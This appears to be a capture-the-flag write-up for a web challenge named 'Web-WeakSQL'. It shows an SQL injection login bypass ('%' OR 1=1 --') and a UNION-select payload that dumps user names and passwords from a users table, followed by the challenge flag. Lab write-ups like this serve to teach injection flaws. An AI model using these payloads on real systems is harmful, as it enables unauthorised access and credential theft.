# Web-WeakSQL

## Introduction

We find an application with only a login page. It is obviously a SQL injection to be done.

## Walkthrough

The payload for connecting is the following:

username: `a`
password: `%' OR 1=1 --'`

Then you arrive in the `/search` directory, a payload here can give us the whole users table:

search: `%' and 1=0 union select null,firstName,lastName,username, password,null,null from users -- `

Flag: **CTFrench{SQL_Sh0uld_b3_Pr0t3ct3d}**